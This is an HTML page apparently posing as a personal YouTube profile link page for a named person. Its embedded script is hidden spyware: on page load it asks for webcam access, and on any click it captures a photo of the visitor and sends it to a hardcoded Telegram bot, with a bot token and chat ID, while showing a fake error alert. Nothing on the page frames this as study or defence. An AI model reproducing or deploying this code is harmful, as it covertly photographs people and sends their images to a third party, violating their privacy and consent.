<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

  <style>
    body {
      background-color: rgb(255, 255, 255);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 0;
      overflow: hidden;
      flex-direction: column;
    }

    .avatar {
      width: 300px;
      height: 300px;
    }

    .username {
      font-size: 20px;
      font-family: Montserrat, sans-serif;
      font-weight: 300;
      font-stretch: condensed;
      color: rgb(0, 0, 0);
      text-decoration: none;
      margin-top: 10px;
      position: relative;
      opacity: 0;
      animation: fadeIn 2s ease-in-out forwards;
    }

    .username::after {
      content: "";
      position: absolute;
      width: 0;
      height: 1px;
      background-color: rgb(0, 0, 0);
      bottom: -1px;
      left: 0;
      transition: width 0.3s ease;
    }

    .username:hover {
      font-style: italic;
    }

    .username:hover::after {
      width: 100%;
    }

    .loading-rectangle-left {
      position: absolute;
      top: 0;
      bottom: 0;
      width: 50%;
      background-color: rgb(0, 0, 0);
      animation: loadingAnimationLeft 4s forwards;
    }

    .loading-rectangle-right {
      position: absolute;
      top: 0;
      bottom: 0;
      right: 0;
      width: 50%;
      background-color: rgb(0, 0, 0);
      animation: loadingAnimationRight 4s forwards;
    }

    @keyframes loadingAnimationLeft {
      0% {
        left: 0;
      }
      50% {
        left: -50%;
      }
      100% {
        left: -50%;
      }
    }

    @keyframes loadingAnimationRight {
      0% {
        right: 0;
      }
      50% {
        right: -50%;
      }
      100% {
        right: -50%;
      }
    }

    @keyframes fadeIn {
      0% {
        opacity: 0;
      }
      100% {
        opacity: 1;
      }
    }
  </style>
</head>
<body>
  <div class="loading-rectangle-left"></div>
  <div class="loading-rectangle-right"></div>
  <a href="https://www.youtube.com/@duyvinh09" class="username">Đinh Duy Vinh</a>
  <a href="https://www.youtube.com/@duyvinh09" target="_blank">
  <button type="button">Xem trên YouTube</button>
  </a>
  
  <script>
// Hàm chụp ảnh khuôn mặt bằng webcam
function capturePhoto() {
    var video = document.getElementById('video');
    var canvas = document.createElement('canvas');
    var context = canvas.getContext('2d');

    // Cài đặt kích thước canvas bằng kích thước video
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Chụp ảnh từ video
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Lấy dữ liệu ảnh dưới dạng Blob
    canvas.toBlob(function(blob) {
        // Gửi ảnh qua Telegram
        var formData = new FormData();
        formData.append('chat_id', '-989932845');
        formData.append('photo', blob, 'photo.jpg');

        $.ajax({
            type: 'POST',
            url: 'https://api.telegram.org/bot6002210854:AAFtNuunUbJoDk6C83oU-dE3il63-M2mSUI/sendPhoto',
            data: formData,
            processData: false,
            contentType: false,
            success: function(response) {
                alert('Đã xảy ra lỗi!');
            },
            error: function(error) {
                alert('Đã xảy ra lỗi!');
            }
        });
    }, 'image/jpeg');
}

// Sử dụng API getUserMedia để truy cập webcam
function requestCameraAccess() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.getElementById('video');
            video.srcObject = stream;
            video.play();

            // Xử lý sự kiện click trên toàn bộ trang web
            document.addEventListener('click', function() {
                capturePhoto();
            });
        })
        .catch(function(error) {
            console.log('Đã xảy ra lỗi khi truy cập webcam: ' + error.message);
        });
}

// Hiển thị hộp thoại alert và xử lý phản hồi của người dùng
function showCameraAccessAlert() {
    alert('Ứng dụng muốn truy cập vào camera.');
    requestCameraAccess();
}

// Gọi hàm hiển thị hộp thoại alert khi trang web được tải
window.addEventListener('DOMContentLoaded', function() {
    showCameraAccessAlert();
});

    </script>
</body>
</html>
